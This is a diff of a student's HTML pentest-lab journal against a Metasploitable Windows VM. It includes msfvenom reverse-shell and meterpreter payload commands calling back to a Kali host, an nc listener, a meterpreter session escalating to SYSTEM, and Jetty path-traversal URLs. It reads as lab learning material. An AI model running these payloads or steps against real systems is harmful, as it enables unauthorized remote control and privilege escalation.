@@ -1413,8 +1413,10 @@ Module options (auxiliary/scanner/http/glassfish_login):
       <a href="https://www.youtube.com/watch?v=3Axp3VDnf0I">https://www.youtube.com/watch?v=3Axp3VDnf0I<br>
       </a><br>
       &nbsp;&nbsp;&nbsp;&nbsp; A good intro to SQL Injection (Both GET and POST
-      methods) 20:00 long<br>
-      <br>
+      methods) 20:00 long</p>
+    <p>The reading about SQL injection is called SQLi on page <a href="http://learn.codingdojo.com/m/307/8277/56313">More
+        Web Pentesting</a>.&nbsp; It mentions a tool, SQLmap, described at <a href="https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/">How
+        to use SQLMAP to test a website for SQL Injection vulnerability</a>.<br>
       &nbsp;</p>
     <h3><a id="mozTocId304124" class="mozTocH3"></a>Buffer Overflow</h3>
     <p><br>
@@ -1704,7 +1706,7 @@ color="#75507B">-jar</font> <font color="#75507B">-Xmx2G</font> <u style="text-d
     <p>Look at
       https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
       .&nbsp; </p>
-    <p><kbd>msfvenom -p windows/x64/shell_reerse_tcp -f exe LHOST =<var>x.x.x.x</var> LPORT=4411 &gt; veno.exe</kbd>
+    <p><kbd><a name="msfvenom" id="msfvenom"></a>msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=<var>x.x.x.x</var> LPORT=4411 &gt; veno.exe</kbd>
       where <var>x.x.x.x</var> is the IP address of the Kali machine<br>
     </p>
     <p><br>
@@ -1727,16 +1729,18 @@ color="#75507B">-jar</font> <font color="#75507B">-Xmx2G</font> <u style="text-d
     </p>
     <p><br>
     </p>
-    <h1>May 2nd</h1>
+    <h1><a id="mozTocId369195" class="mozTocH1"></a>May 2nd</h1>
     <p>Look for APK&nbsp;&nbsp; https://github.com/search?q=APK</p>
     <p>o&nbsp;&nbsp;&nbsp;
       https://fourminutebooks.com/extreme-ownership-summary/ o&nbsp;&nbsp;&nbsp;
 https://www.bhrettmccabe.com/blog/7-leadership-lessons-from-extreme-ownership</p>
-    <p><br>
+    <h2><a id="mozTocId920419" class="mozTocH2"></a>Teach me something</h2>
+    <p>I give my presentation on <a href="https://youtu.be/qgQtS0PbRGw?list=PLQZDxdmHqC9FMtAjJAT2uNZRemfTn6AsB&amp;t=1494">the
+        red shift</a>.<br>
     </p>
     <p><br>
     </p>
-    <h1>May 4th</h1>
+    <h1><a id="mozTocId590790" class="mozTocH1"></a>May 4th</h1>
     <p>The Youtube channel&nbsp;
       https://www.youtube.com/playlist?list=PLQZDxdmHqC9FMtAjJAT2uNZRemfTn6AsB</p>
     <p><br>
@@ -1744,7 +1748,8 @@ https://www.bhrettmccabe.com/blog/7-leadership-lessons-from-extreme-ownership</p
     <p>SY-601 exam get the CompTIA+ </p>
     <p><br>
     </p>
-    <h2>Working on the vulnerability Scanning 2 of 2 lab</h2>
+    <h2><a id="mozTocId168957" class="mozTocH2"></a>Working on the vulnerability
+      Scanning 2 of 2 lab</h2>
     <p>The results are going in the document
       /home/jeffs/Coding_DoJo/vulnerability_labs/2022-05-04_Vulnerability_lab_2_Jeff_Silverman.odt.&nbsp;
       The lab itself is at <a href="http://learn.codingdojo.com/m/307/8878/60090">Vulnerability
@@ -1752,13 +1757,14 @@ https://www.bhrettmccabe.com/blog/7-leadership-lessons-from-extreme-ownership</p
     <p></p>
     <p><br>
     </p>
-    <h3>How to keep the metasploitable virtual machine from shutting down after
-      an hour.</h3>
+    <h3><a id="mozTocId839165" class="mozTocH3"></a>How to keep the
+      metasploitable virtual machine from shutting down after an hour.</h3>
     <p>I found <a href="https://medium.com/tech-learn-share/how-to-stop-expired-windows-server-auto-shutdown-every-hour-c0cd74e0974e">How
         to stop expired Windows Server auto-shutdown every hour</a>.&nbsp;
 https://medium.com/tech-learn-share/how-to-stop-expired-windows-server-auto-shutdown-every-hour-c0cd74e0974e</p>
     <p>I followed the instructions and rebooted at 17:19.</p>
-    <h3>Scan port 8484 - what's running on it?</h3>
+    <h3><a id="mozTocId241448" class="mozTocH3"></a>Scan port 8484 - what's
+      running on it?</h3>
     <br>
     <pre>jeffs@jeffs-desktop:~/Coding_DoJo$ <kbd>nmap -A -p 8484 192.168.0.26</kbd>
 <samp>Starting Nmap 7.80 ( https://nmap.org ) at 2022-05-04 17:30 PDT
@@ -1777,12 +1783,14 @@ Nmap done: 1 IP address (1 host up) scanned in 13.24 seconds</samp>
 jeffs@jeffs-desktop:~/Coding_DoJo$ 
 </pre>
     <p>Jetty winstone-2.8</p>
-    <h3>What was the version of that service?<br>
+    <h3><a id="mozTocId835382" class="mozTocH3"></a>What was the version of that
+      service?<br>
     </h3>
     <p>2.8</p>
-    <h3>Where did you find the code you used to spawn the reverse shell?</h3>
+    <h3><a id="mozTocId666897" class="mozTocH3"></a>Where did you find the code
+      you used to spawn the reverse shell?</h3>
     <p>See also </p>
-    <h2></h2>
+    <h2><a id="mozTocId560013" class="mozTocH2"></a></h2>
     <p> </p>
     <pre><font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
 color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9A06">]</font>
@@ -1805,25 +1813,1400 @@ Shellcodes: No Results
 color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9A06">]</font>
 <font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> 
 
-<br><br></pre>
+</pre>
     <p> </p>
     <p>I went to the <a href="https://www.exploit-db.com/">exploit database</a>
       <a href="https://www.exploit-db.com/exploits/21895">Jetty 3.1.6/3.1.7/4.1
         Servlet Engine - Arbitrary Command Execution page</a>.</p>
     <p>In order to take advantage of this, I have to</p>
     <ol>
-      <li>Create a payload</li>
-      <li>upload the payload to someplace where Jetty can find it</li>
       <li>start a server on the kali machine with known IP address and port
-        number</li>
-      <li>Execute the payload.</li>
+        number&nbsp;&nbsp; <kbd>nc -nvlp 4411
+</kbd></li>
+      <li>Create a payload.&nbsp; Use mfsvenom as shown <a href="#msfvenom">above</a>.</li>
+      <li>upload the payload to someplace where Jetty can find it</li>
+      <li>Have jetty execute the payload.</li>
+      <li>Verify the exploit</li>
     </ol>
     <p><br>
     </p>
+    <p>I started the metasploit Win2k8 VM at 11:05</p>
+    <p><kbd><span style="text-decoration: line-through;">msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.0.14 LPORT=4411 &gt; veno.exe</span></kbd></p>
+    <br>
+    <p><kbd>msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows -f exe LHOST=192.168.0.14 LPORT=4411 &gt; veno.exe</kbd></p>
+    <pre><font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <kbd><font
+color="#4E9A06">msfvenom</font> <font color="#75507B">-p</font> windows/x64/shell_reverse_tcp <font
+color="#75507B">-a</font> x64 <font color="#75507B">--platform</font> windows <font
+color="#75507B">-f</font> exe LHOST=192.168.0.14 LPORT=4411 <font color="#729FCF"><b>&gt;</b></font> <u
+style="text-decoration-style:single">veno.exe</u></kbd>
+<samp>No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes</samp>
+
+                                                                                                                                                                       
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> msfconsole -q -r <kbd><u
+style="text-decoration-style:single">veno.exe</u></kbd>
+
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <font color="#4E9A06">msfpc</font> windows 192.168.0.14 4411                    
+ <font color="#729FCF"><b>[*]</b></font> <font color="#729FCF"><b>MSF</b></font>venom <font
+color="#729FCF"><b>P</b></font>ayload <font color="#729FCF"><b>C</b></font>reator (<font
+color="#729FCF"><b>MSFPC</b></font> v<font color="#729FCF"><b>1.4.5</b></font>)
+ <font color="#FCE94F"><b>[i]</b></font>   IP: <font color="#FCE94F"><b>192.168.0.14</b></font>
+ <font color="#FCE94F"><b>[i]</b></font> PORT: <font color="#FCE94F"><b>4411</b></font>
+ <font color="#FCE94F"><b>[i]</b></font> TYPE: <font color="#FCE94F"><b>windows</b></font> (windows/meterpreter/reverse_tcp)
+ <font color="#FCE94F"><b>[i]</b></font>  CMD: <font color="#000000"><b>msfvenom -p windows/meterpreter/reverse_tcp -f exe \</b></font>
+<font color="#000000"><b>  --platform windows -a x86 -e generic/none LHOST=192.168.0.14 LPORT=4411 \</b></font>
+<font color="#000000"><b>  &gt; '/home/kali/windows-meterpreter-staged-reverse-tcp-4411.exe'</b></font>
+
+ <font color="#FCE94F"><b>[i]</b></font> windows meterpreter created: '<font color="#FCE94F"><b>/home/kali/windows-meterpreter-staged-reverse-tcp-4411.exe</b></font>'
+
+ <font color="#FCE94F"><b>[i]</b></font> MSF handler file: '/home/kali/windows-meterpreter-staged-reverse-tcp-4411-exe.rc'
+ <font color="#FCE94F"><b>[i]</b></font> Run: msfconsole -q -r '/home/kali/windows-meterpreter-staged-reverse-tcp-4411-exe.rc'
+ <font color="#8AE234"><b>[?]</b></font> <font color="#8AE234"><b>Quick web server</b></font> (for file transfer)?: python2 -m SimpleHTTPServer 8080
+ <font color="#729FCF"><b>[*]</b></font> <font color="#729FCF"><b>Done</b></font>!
+                                                                                
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#000000"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> ls-l<br>...<br>-rwxr-xr-x 1 kali    73802 May  5 02:39  <font
+color="#8AE234"><b>windows-meterpreter-staged-reverse-tcp-4411.exe</b></font>
+-rw-r--r-- 1 kali      325 May  5 02:39  windows-meterpreter-staged-reverse-tcp-4411-exe.rc
+                                                                                              
+<font color="#4E9A06">┌──(</font><font color="#729FCF"><b>kali㉿kali</b></font><font
+color="#4E9A06">)-[</font><font color="#EAFB05"><b>~</b></font><font color="#4E9A06">]</font>
+<font color="#4E9A06">└─</font><font color="#729FCF"><b>$</b></font> <font color="#4E9A06">msfconsole</font> <font
+color="#75507B">-q</font> <font color="#75507B">-r</font> <u style="text-decoration-style:single">windows-meterpreter-staged-reverse-tcp-4411-exe.rc</u>
+<font color="#729FCF"><b>[*]</b></font> Processing windows-meterpreter-staged-reverse-tcp-4411-exe.rc for ERB directives.
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; use exploit/multi/handler
+<font color="#729FCF"><b>[*]</b></font> Using configured payload generic/shell_reverse_tcp
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+PAYLOAD =&gt; windows/meterpreter/reverse_tcp
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; set LHOST 192.168.0.14
+LHOST =&gt; 192.168.0.14
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; set LPORT 4411
+LPORT =&gt; 4411
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; set ExitOnSession false
+ExitOnSession =&gt; false
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; set EnableStageEncoding true
+EnableStageEncoding =&gt; true
+resource (windows-meterpreter-staged-reverse-tcp-4411-exe.rc)&gt; run -j
+<font color="#729FCF"><b>[*]</b></font> Exploit running as background job 0.
+<font color="#729FCF"><b>[*]</b></font> Exploit completed, but no session was created.
+
+<font color="#729FCF"><b>[*]</b></font> Started reverse TCP handler on 192.168.0.14:4411 
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EF2929"><b>multi/handler</b></font>) &gt; 
+
+
+
+</pre>
+    <p></p>
+    <p>I was expecting to have to run nc but msfconsole does that for me.</p>
+    <pre><u style="text-decoration-style:single">msf6</u> exploit(<font color="#EF2929"><b>multi/handler</b></font>) &gt; sessions -i 4
+<font color="#729FCF"><b>[*]</b></font> Starting interaction with 4...
+
+<br><u style="text-decoration-style:single">meterpreter</u> &gt; <kbd>getsystem</kbd>
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+<u style="text-decoration-style:single">meterpreter</u> &gt; <br>meterpreter &gt; <kbd>dir</kbd>
+<samp>Listing: C:\Users\Administrator\Downloads
+=========================================
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+040777/rwxrwxrwx  0      dir   2022-04-20 20:38:23 -0400  JeffWasHere
+100666/rw-rw-rw-  282    fil   2022-04-08 04:58:14 -0400  desktop.ini
+100777/rwxrwxrwx  73802  fil   2022-05-05 03:00:29 -0400  windows-meterpreter-staged-reverse-tcp-4411.exe</samp>
+
+<u style="text-decoration-style:single">meterpreter</u> &gt; <br><u style="text-decoration-style:single">meterpreter</u> &gt; <kbd>shell</kbd>
+<samp>Process 3380 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32&gt;
+
+C:\Windows\system32&gt;</samp><kbd>whoami</kbd>
+<samp>whoami
+nt authority\system
+</samp>
+C:\Windows\system32&gt;
+C:\Windows\system32&gt;<kbd>cd c:\Users\Administrator</kbd>
+<samp>cd c:\Users\Administrator
+</samp>
+c:\Users\Administrator&gt;<kbd>echo "All of your bases belong to us bwah hah hah hah" &gt; I_have_returned.txt</kbd>
+<samp>echo "All of your bases belong to us bwah hah hah hah" &gt; I_have_returned.txt</samp>
+
+c:\Users\Administrator&gt;<kbd>dir</kbd>
+<samp>dir
+ Volume in drive C is Windows 2008R2
+ Volume Serial Number is E033-D7ED
+
+ Directory of c:\Users\Administrator
+
+<span style="color: #666666;">05/05/2022  12:14 AM    &lt;DIR&gt;          .
+05/05/2022  12:14 AM    &lt;DIR&gt;          ..
+05/04/2022  05:07 PM    &lt;DIR&gt;          .ssh
+04/08/2022  01:58 AM    &lt;DIR&gt;          Contacts
+04/08/2022  01:58 AM    &lt;DIR&gt;          Desktop
+04/08/2022  01:58 AM    &lt;DIR&gt;          Documents
+05/05/2022  12:00 AM    &lt;DIR&gt;          Downloads
+04/08/2022  01:58 AM    &lt;DIR&gt;          Favorites</span>
+05/05/2022  12:14 AM                52 <b>I_have_returned.txt</b>
+<span style="color: #666666;">04/08/2022  01:58 AM    &lt;DIR&gt;          Links
+04/08/2022  01:58 AM    &lt;DIR&gt;          Music
+04/08/2022  01:58 AM    &lt;DIR&gt;          Pictures
+05/04/2022  05:09 PM                22 PSTools.zip
+05/04/2022  05:08 PM    &lt;DIR&gt;          PSTools_Dir
+04/08/2022  01:58 AM    &lt;DIR&gt;          Saved Games
+04/08/2022  01:58 AM    &lt;DIR&gt;          Searches
+04/08/2022  01:58 AM    &lt;DIR&gt;          Videos</span>
+               2 File(s)             74 bytes
+              15 Dir(s)  43,667,791,872 bytes free
+</samp>
+c:\Users\Administrator&gt;
+
+c:\Users\Administrator&gt;<kbd>echo 'name'</kbd>
+<samp>echo 'name'
+'name'</samp>
+
+c:\Users\Administrator&gt;<kbd>echo 'Jeff Silverman'</kbd>
+<samp>echo 'Jeff Silverman'
+'Jeff Silverman'
+</samp>
+c:\Users\Administrator&gt;<kbd>date</kbd>
+<samp>date
+The current date is: Thu 05/05/2022 
+Enter the new date: (mm-dd-yy) 
+</samp>
+
+c:\Users\Administrator&gt;
+
+<u style="text-decoration-style:single">msf6</u> exploit(<font color="#EF2929"><b>multi/handler</b></font>) &gt; <kbd>sessions -i 5</kbd>
+<font color="#729FCF"><b>[*]</b></font> Starting interaction with 5...
+
+<u style="text-decoration-style:single">meterpreter</u> &gt; <kbd>shell</kbd>
+<samp>Process 2036 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserve</samp>d.
+
+C:\Users\Administrator\Downloads&gt;<kbd>whoami</kbd>
+<samp>whoami
+vagrant-2008r2\administrator</samp>
+
+C:\Users\Administrator\Downloads&gt;<kbd>exit</kbd>
+exit
+<u style="text-decoration-style:single">meterpreter</u> &gt; <kbd>getsystem</kbd>
+<samp>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</samp>
+<u style="text-decoration-style:single">meterpreter</u> &gt; <kbd>shell</kbd>
+<samp>Process 316 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+</samp>
+C:\Windows\system32&gt;<kbd>whoami</kbd>
+<samp>whoami
+nt authority\system</samp>
+
+C:\Windows\system32&gt;
+
+
+
+</pre>
+    <p></p>
+    <pre>http://192.168.0.26:8484/cgi-bin/..\..\..\..\..\..\..\..\..\..\..\..\Users\Administrator\Downloads\windows-meterpreter-staged-reverse-tcp-4411.exe</pre>
+    <pre>http://192.168.0.26:8484/cgi-bin/..\..\..\..\..\..\..\..\..\..\Users\Administrator\Downloads\windows-meterpreter-staged-reverse-tcp-4411.exe</pre>
+    <pre>http://192.168.0.26:8484/cgi-bin/..\..\..\..\..\..\..\..\..\Users\Administrator\Downloads\windows-meterpreter-staged-reverse-tcp-4411.exe </pre>
+    <pre>http://192.168.0.26:8484/cgi-bin/..\..\..\..\..\..\..\..\Users\Administrator\Downloads\windows-meterpreter-staged-reverse-tcp-4411.exe <br>
+    
+    http://192.168.0.26:8484/cgi-bin/..\..\..\..\..\..\Users\Administrator\Downloads\windows-meterpreter-staged-reverse-tcp-4411.exe<br><br><br>
+    
+    </pre>
+    <p> Working with firefox is very confusing. For some reason, it keeps
+      re-writing the URL. That makes no sense. Is there a redirect? If so, I
+      can't find it. What does curl say? </p>
+    <pre>jeffs@jeffs-desktop:~/Coding_DoJo$ <kbd>curl -v -i "http://192.168.0.26:8484/cgi-bin/../../../../../../Users/Administrator/Downloads/windows-meterpreter-staged-reverse-tcp-4411.exe"</kbd>
+<span style="background-color:pink;">*   Trying 192.168.0.26:8484...
+* TCP_NODELAY set
+* Connected to 192.168.0.26 (192.168.0.26) port 8484 (#0)
+&gt; GET /Users/Administrator/Downloads/windows-meterpreter-staged-reverse-tcp-4411.exe HTTP/1.1</span><span
+style="background-color:pink;">http://192.168.0.26:8484/cgi-bin/..\..\..\..\..\..\..\..\..\..\..\..\Users\Administrator\Downloads\windows-meterpreter-staged-reverse-tcp-4411.e
+
+&gt; Host: 192.168.0.26:8484
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt; </span>
+<samp>* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 404 Not Found
+HTTP/1.1 404 Not Found
+&lt; X-Content-Type-Options: nosniff
+<font color="#FA1111"><b>X-Content-Type-Options</b></font>: nosniff
+&lt; Content-Type: text/html;charset=ISO-8859-1
+<font color="#FA1111"><b>Content-Type</b></font>: text/html;charset=ISO-8859-1
+&lt; Cache-Control: must-revalidate,no-cache,no-store
+<font color="#FA1111"><b>Cache-Control</b></font>: must-revalidate,no-cache,no-store
+&lt; Content-Length: 1442
+<font color="#FA1111"><b>Content-Length</b></font>: 1442
+&lt; Server: Jetty(winstone-2.8)
+<font color="#FA1111"><b>Server</b></font>: Jetty(winstone-2.8)</samp>
+</pre>
+    <p> This next invocation was done correctly!</p>
+    <pre><br>jeffs@jeffs-desktop:~/Coding_DoJo$ <kbd>curl -v -i "http://192.168.0.26:8484/cgi-bin/"</kbd>
+<span style="background-color:pink;">*   Trying 192.168.0.26:8484...
+* TCP_NODELAY set
+* Connected to 192.168.0.26 (192.168.0.26) port 8484 (#0)
+&gt; GET /cgi-bin/ HTTP/1.1
+&gt; Host: 192.168.0.26:8484
+&gt; User-Agent: curl/7.68.0
+&gt; Accept: */*
+&gt; </span>
+<samp>* Mark bundle as not supporting multiuse
+&lt; HTTP/1.1 404 Not Found
+HTTP/1.1 404 Not Found
+&lt; X-Content-Type-Options: nosniff
+<font color="#FA1111"><b>X-Content-Type-Options</b></font>: nosniff
+&lt; Content-Type: text/html;charset=ISO-8859-1
+<font color="#FA1111"><b>Content-Type</b></font>: text/html;charset=ISO-8859-1
+&lt; Cache-Control: must-revalidate,no-cache,no-store
+<font color="#FA1111"><b>Cache-Control</b></font>: must-revalidate,no-cache,no-store
+&lt; Content-Length: 1373
+<font color="#FA1111"><b>Content-Length</b></font>: 1373
+&lt; Server: Jetty(winstone-2.8)
+<font color="#FA1111"><b>Server</b></font>: Jetty(winstone-2.8)</samp>
+<samp>
+&lt; 
+&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1"/&gt;
+&lt;title&gt;Error 404 Not Found&lt;/title&gt;
+&lt;/head&gt;
+</samp></pre>
+    <p><br>
+    </p>
+    <h1><a id="mozTocId484246" class="mozTocH1"></a>May 6th</h1>
+    <p>I think I am missing a lab in here somewhere....&nbsp; <a href="http://learn.codingdojo.com/m/307/8277/56313">SQL
+        injection</a>.&nbsp; That page references </p>
+    <p> <a href="https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/"
+        target="_blank">https://www.geeksforgeeks.org/use-sqlmap-test-website-sql-injection-vulnerability/</a>
+      and
+https://scottc130.medium.com/how-to-use-wfuzz-to-fuzz-web-applications-8594c11d59d1&nbsp;</p>
+    <p> https://www.owasp.org/index.php/OWASP_Juice_Shop_Project</p>
+    <p><br>
+    </p>
+    <p>https://www.thomaslaurenson.com/blog/2018-07-12/installing-and-configuring-DVWA/</p>
+    <p>https://www.developsec.com/2018/05/10/installing-owasp-juiceshop-with-docker/</p>
+    <p> https://www.owasp.org/index.php/OWASP_Juice_Shop_Project which points to
+      the <a href="https://hub.docker.com/r/bkimminich/juice-shop">bkimminich/juice-shop</a>
+      <a href="https://hub.docker.com">docker</a> page.</p>
+    <p></p>
+    <p><br>
+    </p>
+    <p></p>
+    <p><br>
+    </p>
+    <p>https://scottc130.medium.com/how-to-use-wfuzz-to-fuzz-web-applications-8594c11d59d1</p>
+    <h2><a id="mozTocId318816" class="mozTocH2"></a>Deliberately Vulnerable Web
+      Application (DVWA)</h2>
+    <h3><a id="mozTocId78375" class="mozTocH3"></a>Installation</h3>
+    <pre>jeffs@jeffs-desktop:~/Coding_DoJo/DVWA$ <kbd>sudo systemctl start docker</kbd>
+jeffs@jeffs-desktop:~/Coding_DoJo/DVWA$ <kbd>sudo systemctl status docker</kbd>
+<samp><font color="#8AE234"><b>●</b></font> docker.service - Docker Application Container Engine
+     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
+     Active: <font color="#8AE234"><b>active (running)</b></font> since Fri 2022-05-06 08:57:03 PDT; 16h ago
+TriggeredBy: <font color="#8AE234"><b>●</b></font> docker.socket
+       Docs: https://docs.docker.com
+   Main PID: 3089 (dockerd)
+      Tasks: 16
+     Memory: 115.5M
+     CGroup: /system.slice/docker.service
+             └─3089 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.291585619-07:00" level=warning msg="Your kernel does not support CPU realtime scheduler"
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.291593670-07:00" level=warning msg="Your kernel does not support cgroup blkio weight"
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.291600383-07:00" level=warning msg="Your kernel does not support cgroup blkio weight_device"
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.292010875-07:00" level=info msg="Loading containers: start."
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.737636952-07:00" level=info msg="Default bridge (docker0) is assigned with an IP address 172.17.0.<span
+style="background-color:#80FC04"><font color="#000000">&gt;</font></span>
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.840234273-07:00" level=info msg="Loading containers: done."
+May 06 08:57:03 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:03.207751421-07:00" level=info msg="Docker daemon" commit=87a90dc graphdriver(s)=overlay2 version=20.<span
+style="background-color:#80FC04"><font color="#000000">&gt;</font></span>
+May 06 08:57:03 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:03.210435940-07:00" level=info msg="Daemon has completed initialization"
+May 06 08:57:03 jeffs-desktop systemd[1]: Started Docker Application Container Engine.
+May 06 08:57:03 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:03.264127845-07:00" level=info msg="API listen on /run/docker.sock"</samp>
+jeffs@jeffs-desktop:~/Coding_DoJo/DVWA$ 
+<span style="text-decoration: line-through;">jeffs@jeffs-desktop:~/Coding_DoJo/DVWA$ <kbd>sudo docker pull bkimminich/juice-shop</kbd>
+<samp>Using default tag: latest
+latest: Pulling from bkimminich/juice-shop
+3aa4d0bbde19: Pull complete 
+1ef6f24acb8c: Pull complete 
+cce98d98dea3: Pull complete 
+402b4d5fa115: Pull complete 
+7ce100a0f5b6: Pull complete 
+0c967273558c: Pull complete 
+ae2d7f68ac99: Pull complete 
+d49f4ddd0060: Pull complete 
+Digest: sha256:cc936d5b92ddb9741fc22f79fe879be62dbc1122fe3ca3042ef612f2b77a1011
+Status: Downloaded newer image for bkimminich/juice-shop:latest
+docker.io/bkimminich/juice-shop:latest</samp>
+jeffs@jeffs-desktop:~/Coding_DoJo/DVWA$ sudo </span><code><code><span style="text-decoration: line-through;">docker run --rm -p 3000:3000 bkimminich/juice-shop</span><br></code></code>&nbsp;</pre>
+    <p></p>
+    <p><span style="text-decoration: line-through;">http://192.168.0.149:3000/#/
+        is working: the OWASP Juice Shop.</span></p>
+    <p><span style="text-decoration: line-through;">I want the Damm Vulnerable
+        Web Application (DVWA) and I should get it from <a href="https://dvwa.co.uk/">DVWA</a>.&nbsp;
+        I've got it in ~/Coding_DoJo/DVWA.&nbsp; I've got nginx running on
+        jeffs-desktop - how brave am I feeling?<br>
+      </span></p>
+    <p><span style="text-decoration: line-through;">It turns out that nginx on
+        jeffs_desktop is not set up for PHP.</span></p>
+    <h4><a id="mozTocId909583" class="mozTocH4"></a>Installation using docker</h4>
+    <p>The DVWA page points to a <a href="https://github.com/digininja/DVWA">github
+        repo</a> which refers to <a href="https://hub.docker.com/r/vulnerables/web-dvwa/">a
+        docker page</a>.</p>
     <p><br>
     </p>
     <p><br>
     </p>
+    <h2><a id="mozTocId424752" class="mozTocH2"></a> Local File Inclusion (LFI)
+      / Remote File Intrustion (RFI</h2>
+    <p><a href="http://learn.codingdojo.com/m/307/8880/60083">LFI/RFI</a></p>
+    <p>Make sure that the docker daemon is running:</p>
+    <pre>jeffs@jeffs-desktop:~$ <kbd>sudo systemctl status docker</kbd><br><samp><font
+color="#8AE234"><b>●</b></font> docker.service - Docker Application Container Engine
+     Loaded: loaded (/lib/systemd/system/docker.service; enabled; vendor preset: enabled)
+     Active: <font color="#8AE234"><b>active (running)</b></font> since Fri 2022-05-06 08:57:03 PDT; 1 day 14h ago
+TriggeredBy: <font color="#8AE234"><b>●</b></font> docker.socket
+       Docs: https://docs.docker.com
+   Main PID: 3089 (dockerd)
+      Tasks: 16
+     Memory: 273.5M
+     CGroup: /system.slice/docker.service
+             └─3089 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
+
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.737636952-07:00" level=info msg="Default bridge (docker0) is assigned with an IP address 172.17.0.0/16. Daemon option --bip can be used to set a preferred IP address"
+May 06 08:57:02 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:02.840234273-07:00" level=info msg="Loading containers: done."
+May 06 08:57:03 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:03.207751421-07:00" level=info msg="Docker daemon" commit=87a90dc graphdriver(s)=overlay2 version=20.10.14
+May 06 08:57:03 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:03.210435940-07:00" level=info msg="Daemon has completed initialization"
+May 06 08:57:03 jeffs-desktop systemd[1]: Started Docker Application Container Engine.
+May 06 08:57:03 jeffs-desktop dockerd[3089]: time="2022-05-06T08:57:03.264127845-07:00" level=info msg="API listen on /run/docker.sock"
+May 07 01:29:20 jeffs-desktop dockerd[3089]: time="2022-05-07T01:29:20.840424589-07:00" level=info msg="ignoring event" container=fbe61c0566d43183fc68d563aac90ad4839512df368bad0006213fe086f1ed21 module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
+May 07 01:31:20 jeffs-desktop dockerd[3089]: time="2022-05-07T01:31:20.068398312-07:00" level=error msg="Not continuing with pull after error: errors:\ndenied: requested access to the resource is denied\nunauthorized: authentication required\n"
+May 07 01:31:20 jeffs-desktop dockerd[3089]: time="2022-05-07T01:31:20.068444988-07:00" level=info msg="Ignoring extra error returned from registry: unauthorized: authentication required"
+May 07 01:52:30 jeffs-desktop dockerd[3089]: time="2022-05-07T01:52:30.975412626-07:00" level=info msg="ignoring event" container=6e844b5e90a59c9a7a95ef38c527a2b5e80e9b1a962a4967600350d83fe15b1b module=libcontainerd namespace=moby topic=/tasks/delete type="*events.TaskDelete"
+</samp><font color="#EAFB05"><b>~</b></font>
+
+&nbsp;</pre>
+    <p></p>
+    <p>Start the juice shop container (--rm=False means that the container file
+      won't be destroyed when the session ends): <code><code></code></code><br>
